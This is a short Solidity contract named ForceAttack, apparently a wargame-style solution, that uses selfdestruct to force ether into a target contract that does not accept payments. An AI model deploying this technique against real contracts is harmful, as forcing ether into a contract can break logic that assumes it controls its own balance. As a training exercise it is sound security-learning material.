// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function sendToForce(address payable _forceAddress) public {
        selfdestruct(_forceAddress);
    }
}
